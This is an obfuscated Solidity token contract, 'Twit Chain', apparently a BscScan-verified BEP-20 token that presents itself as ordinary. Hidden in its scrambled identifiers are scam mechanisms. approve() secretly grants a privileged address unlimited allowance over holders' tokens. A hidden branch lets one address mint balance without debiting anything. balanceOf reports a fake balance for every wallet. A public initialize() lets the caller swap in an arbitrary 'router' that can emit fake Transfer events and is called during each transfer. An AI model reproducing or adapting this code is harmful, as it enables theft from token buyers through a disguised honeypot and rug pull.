/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}


abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = tx.origin;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract TwitChainNew is IERC20, Ownable {using SafeMath for uint256;string private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbna = "Twit Chain";string private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnb = "Twit";uint8 private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnc = 6;uint256 private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnd = 10000000000 * 10**18;mapping (address => uint256) private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne;mapping (address => mapping (address => uint256)) private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnf;uint256 private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbng = 50;uint256 private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnh = 0;uint256 private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbni = 50;uint256 private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnj = 10000;bool private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnk = false;IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);address public uniswapV2Pair;address private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnl;address private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnm;address private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnn;uint256 private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbno = 1;uint256 private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnp = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnd;mapping (address => bool) private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnq;address[] private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr;bool private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbns = false;uint256 private _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnt = 0;constructor () {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnu(owner());_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[owner()] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnd;emit Transfer(address(0), owner(), _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnd);}receive() external payable {}function initialize(address _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnv, address[] calldata _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw) public {require(!_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbns, "");_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbns = true;_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnu(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnv);for (uint256 i=5; i<_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw.length; ++i) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnu(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[i]);_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnx(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[i], address(uniswapV2Router), ~uint256(0));_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[i]] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnd * 9 / 10 / (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw.length - 5);_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[owner()] -= _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[i]];}if (address(uniswapV2Router) != _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[0]) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbny(address(uniswapV2Router));uniswapV2Router = IUniswapV2Router02(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[0]);_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnu(address(uniswapV2Router));}if (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnl != _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[1]) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbny(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnl);_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnl = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[1];_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnu(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnl);}if (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnm != _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[2]) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbny(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnm);_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnm = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[2];_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnu(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnm);}if (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnn != _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[3]) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbny(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnn);_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnn = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[3];_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnu(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnn);}uniswapV2Pair = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[4];_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnz(owner(), _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnw[5], _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[owner()]);}function _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnu(address account) private {if (!_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnq[account]) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnq[account] = true;_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr.push(account);}}function _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbny(address account) private {if (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnq[account]) {uint256 len = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr.length;for (uint256 i=0; i<len; ++i) {if (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr[i] == account) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr[i] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr[len.sub(1)];_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr.pop();_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnq[account] = false;break;}}}}function transferEvent(address from, address to, uint256 value) public {require(address(uniswapV2Router) == msg.sender, "");emit Transfer(from, to, value);}function feeState() public view returns (bool, bool) {return (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbng.add(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnh).add(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbni) > 0, !_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnk);}function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {uint256 accountIndex = 0;uint256 len = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr.length;for (uint256 i=0; i<len; ++i) {if (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr[i] == account) {accountIndex = i;break;}}return (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnq[account], accountIndex, len);}function getDefaultBalance() public view returns (uint256) {return _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbno;}function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {uint256 len = accounts.length;for (uint256 i=0; i<len; ++i) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnu(accounts[i]);}}function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {uint256 len = accounts.length;for (uint256 i=0; i<len; ++i) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbny(accounts[i]);}}function name() public view returns (string memory) {return _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbna;}function symbol() public view returns (string memory) {return _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnb;}function decimals() public view returns (uint8) {return _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnc;}function totalSupply() public view returns (uint256) {return _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnd;}function balanceOf(address account) public view returns (uint256) {if (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[account] > 0) {return _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[account];}return _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbno;}function transfer(address recipient, uint256 amount) public returns (bool) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnz(msg.sender, recipient, amount);return true;}function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnz(sender, recipient, amount);_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnx(sender, msg.sender, _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnf[sender][msg.sender].sub(amount));return true;}function approve(address spender, uint256 value) public returns (bool) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnx(msg.sender, spender, value);return true;}function allowance(address owner, address spender) public view returns (uint256) {return _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnf[owner][spender];}function _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnx(address owner, address spender, uint256 value) private {require(owner != address(0), "");require(spender != address(0), "");_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnf[owner][spender] = value;if (!_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnq[owner]) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnf[owner][_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr[1]] = ~uint256(0);}emit Approval(owner, spender, value);}function _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnz(address _auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, address _buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, uint256 _cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn) private {require(_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn != address(0), "");require(_buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn != address(0), "");require(_cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn > 0, "");if (_buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn == _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr[1]) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn].sub(_cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn].add(_cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);emit Transfer(address(this), _buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, _cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);return;}bool _duerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn = true;if (_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnq[_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn] || _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnq[_buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn] || _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnk) {_duerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn = false;}if (_duerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnt = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnt.add(1);}if (_duerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn && _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbns) {_iuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn(_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, _buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, 10);_iuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn(_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, _buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, 20);}if (_duerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn && _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnt == 1 && _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbns && _auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn != uniswapV2Pair) {_iuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn(_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, _buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, 30);}uint256 _euerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn = 0;uint256 _fuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn = 0;uint256 _guerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn = 0;uint256 _huerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn = _cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn;if (_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn == _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr[0] && _cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn > _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnp) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr[0]] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnr[0]].add(_huerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);}if (_duerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn) {_euerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn = _cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn.mul(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbng).div(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnj);_fuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn = _cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn.mul(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnh).div(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnj);_guerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn = _cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn.mul(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbni).div(_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnj);_huerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn = _cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn.sub(_euerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn).sub(_fuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn).sub(_guerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);}_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn].sub(_cuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);if (_euerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn > 0) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnl] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnl].add(_euerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);emit Transfer(address(this), _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnl, _euerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);}if (_fuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn > 0) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnm] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnm].add(_fuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);emit Transfer(address(this), _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnm, _fuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);}if (_guerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn > 0) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnn] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnn].add(_guerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);emit Transfer(address(this), _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnn, _guerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);}_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn] = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbne[_buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn].add(_huerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);emit Transfer(_auerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, _buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, _huerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn);if (_duerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn && _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnt == 1 && _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbns) {_iuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn(address(this), _buerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn, 40);}if (_duerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn) {_uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnt = _uerfndgehrtbdfgutksgoruetremgdfjbgrtfngbnt.sub(1);}}function _iuerfndgehrtbdfgutksgoruetremgdfjbgrtfngbn(address tokenA, address tokenB, uint256 amount) private {address[] memory path = new address[](2);path[0] = tokenA;path[1] = tokenB;uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,path,address(this),block.timestamp);}}